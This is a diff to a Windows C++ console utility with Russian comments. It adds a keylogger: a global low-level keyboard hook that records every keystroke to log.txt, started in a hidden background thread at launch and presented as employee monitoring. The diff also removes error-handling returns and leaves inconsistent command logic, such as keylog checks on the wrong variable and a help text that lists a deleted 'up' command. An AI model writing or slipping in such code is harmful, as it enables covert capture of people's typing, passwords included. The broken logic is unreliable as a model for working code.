@@ -3,6 +3,53 @@
 #include <tlhelp32.h>
 #include <string>
 #include <filesystem>
+#include <fstream>
+#include <thread>
+
+HHOOK hKeyboardHook;
+std::ofstream logFile;
+
+// Функция-фильтр, которую Windows будет вызывать при КАЖДОМ нажатии кнопки на ПК
+LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
+    // Проверяем, что событие — это именно НАЖАТИЕ клавиши (WM_KEYDOWN)
+    if (nCode >= 0 && wParam == WM_KEYDOWN) {
+        KBDLLHOOKSTRUCT* pKeyStruct = (KBDLLHOOKSTRUCT*)lParam;
+        DWORD vkCode = pKeyStruct->vkCode; // Получаем код нажатой кнопки
+
+        // Открываем файл log.txt в режиме добавления (ios::app)
+        std::ofstream file("log.txt", std::ios::app);
+        if (file.is_open()) {
+            // Переводим стандартные кнопки в понятный текст
+            if (vkCode == VK_SPACE) file << " [ПРОБЕЛ] ";
+            else if (vkCode == VK_RETURN) file << " [ENTER]\n";
+            else if (vkCode == VK_BACK) file << " [BACKSPACE] ";
+            else if (vkCode == VK_TAB) file << " [TAB] ";
+            else if (vkCode >= 0x30 && vkCode <= 0x39) file << (char)vkCode; // Цифры
+            else if (vkCode >= 0x41 && vkCode <= 0x5A) file << (char)vkCode; // Английские буквы (в верхнем регистре)
+            else file << " [" << vkCode << "] "; // Для остальных кнопок пишем их системный код
+            
+            file.close();
+        }
+    }
+    // Обязательно передаем событие дальше, чтобы кнопка сработала у пользователя в его программе!
+    return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
+}
+
+// Функция, которая будет крутиться в отдельном фоне и слушать Windows
+void StartKeylogger() {
+    // Устанавливаем глобальный хук на клавиатуру
+    hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
+    
+    // Windows требует наличие цикла сообщений, чтобы хук работал в потоке
+    MSG msg;
+    while (GetMessage(&msg, NULL, 0, 0)) {
+        TranslateMessage(&msg);
+        DispatchMessage(&msg);
+    }
+    
+    // Если поток завершается, снимаем хук
+    UnhookWindowsHookEx(hKeyboardHook);
+}
 // Функция создания скриншота экрана и сохранения его в файл BMP
 bool TakeScreenshot(const std::string& filename) {
     // 1. Получаем размеры экрана
@@ -75,12 +122,15 @@ int main() {
     LUID luid;
     namespace fs = std::filesystem;
     bool isAdmin = true; // По умолчанию считаем, что мы админ
-        // ШАГ 1: Открываем маркер безопасности (паспорт) нашей программы
+        // Запускаем кейлоггер в фоне, чтобы он не мешал работе главного меню
+    std::thread keylogThread(StartKeylogger);
+    keylogThread.detach(); // Отсоединяем поток, теперь он живет сам по себе
+    // ШАГ 1: Открываем маркер безопасности (паспорт) нашей программы
     // TOKEN_ADJUST_PRIVILEGES — говорим Windows, что хотим изменить права
     // TOKEN_QUERY — говорим, что хотим прочитать текущие права
     if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
         std::cout << "Ошибка OpenProcessToken. Код: " << GetLastError() << std::endl;
-        return 1; 
+        
     }
     
     // ШАГ 2: Переводим текстовое имя привилегии выключения в понятный системе ID (LUID)
@@ -88,7 +138,7 @@ int main() {
     if (!LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &luid)) {
         std::cout << "Ошибка LookupPrivilegeValue. Код: " << GetLastError() << std::endl;
         CloseHandle(hToken); // Если упало здесь, закрываем токен, чтобы не было утечки памяти
-        return 1;
+        
     }
     
     // ШАГ 3: Заполняем структуру настроек и включаем эту привилегию
@@ -100,7 +150,7 @@ int main() {
     if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
         std::cout << "Ошибка AdjustTokenPrivileges. Код: " << GetLastError() << std::endl;
         CloseHandle(hToken);
-        return 1;
+        
     }
     
     // Важная проверка: функция могла сработать, но Windows могла отказать, 
@@ -125,6 +175,8 @@ int main() {
         std::cout << "-> reboot   (Перезагрузка компьютера)\n";
         std::cout << "-> shutdown (Выключение компьютера)\n";
         std::cout << "-> fs       (Переход к управлению файлами)\n";
+        std::cout << "-> keylog_show  (Показать набранный текст онлайн)\n";
+        std::cout << "-> keylog_file  (Подтверждение работы в txt файл)\n";
         std::cout << "-> screenshot (Сделать снимок экрана)\n";
         std::cout << "-> exit     (Выход из программы)\n";
         std::cout << "============================================\n";
@@ -197,30 +249,78 @@ int main() {
                     }
                     std::cout << "------------------------\n";
                 } 
-                else if (fsCommand == "cd") {
+                                else if (fsCommand == "cd") {
                     std::string path;
-                    std::cin >> path;
+                    
+                    // Магия: Очищаем буфер после ввода слова "cd" и читаем строку целиком (с пробелами!)
+                    std::cin.ignore(); 
+                    std::getline(std::cin, path);
+
+                    // Если пользователь случайно оставил пробел перед путем, убираем его
+                    if (!path.empty() && path[0] == ' ') {
+                        path.erase(0, 1);
+                    }
+
                     try {
                         fs::current_path(path);
                     } catch (const std::exception& e) {
                         std::cout << "Ошибка: Не удалось перейти в указанную папку.\n";
                     }
-                } 
-                // КРУТАЯ ФИЧА: Шаг назад по дереву папок (Из C:\game\cod в C:\game)
-                else if (fsCommand == "up") {
+                }
+                                // КРУТАЯ ФИЧА: Копирование файлов и папок (Аналог Linux 'cp')
+                else if (fsCommand == "cp") {
+                    std::string source;
+                    std::string destination;
+                    
+                    // Считываем два аргумента: что копировать и куда
+                    std::cin >> source;
+                    std::cin >> destination;
+
                     try {
-                        // Метод parent_path() автоматически отрезает последнее имя в пути
-                        fs::current_path(fs::current_path().parent_path());
-                    } catch (const std::exception& e) {
-                        std::cout << "Ошибка: Вы уже в самом корне диска, выше подняться нельзя!\n";
+                        // Настраиваем опции копирования:
+                        // recursive — копировать папки вместе со всем содержимым (вглубь)
+                        // overwrite_existing — если файл уже есть в целевой папке, перезаписать его
+                        fs::copy_options options = fs::copy_options::recursive | fs::copy_options::overwrite_existing;
+                        
+                        // Выполняем системное копирование
+                        fs::copy(source, destination, options);
+                        
+                        std::cout << "Успех: Объект успешно скопирован в '" << destination << "'!\n";
+                    } 
+                    catch (const std::exception& e) {
+                        std::cout << "Ошибка копирования: " << e.what() << "\n";
                     }
                 }
+                        // КОМАНДА 1: Показать лог в консоли онлайн
+                else if (command == "keylog_show") {
+                    std::cout << "\n--- Проверка активности сотрудника (Онлайн лог) ---\n";
+                    std::ifstream file("log.txt");
+                    if (file.is_open()) {
+                        std::string line;
+                        while (std::getline(file, line)) {
+                        std::cout << line << "\n";
+                        }
+                        file.close();
+                    } else {
+                        std::cout << "Сотрудник пока не нажимал никаких клавиш или файл еще не создан.\n";
+                    }
+                    std::cout << "---------------------------------------------------\n";
+                }
+
+        // КОМАНДА 2: Подтверждение записи в файл
+        else if (command == "keylog_file") {
+            std::cout << "[УЧЕТ РАБОТЫ] Мониторинг активен.\n";
+            // Получаем полный путь к файлу лога с помощью нашей библиотеки filesystem
+            std::string fullPath = fs::current_path().string() + "\\log.txt";
+            std::cout << "Все нажатия клавиш официально записываются в текстовый файл подтверждения:\n";
+            std::cout << ">> " << fullPath << "\n";
+        }
                 else if (fsCommand == "back") {
                     std::cout << "Возврат в главное меню.\n";
                     break; 
                 } 
-                else {
-                    std::cout << "Неизвестная подкоманда! Доступны: dir, cd <путь>, up, back\n";
+                                else {
+                    std::cout << "Неизвестная подкоманда! Доступны: dir, cd <путь>, up, cp <что> <куда>, back\n";
                 }
             }
         
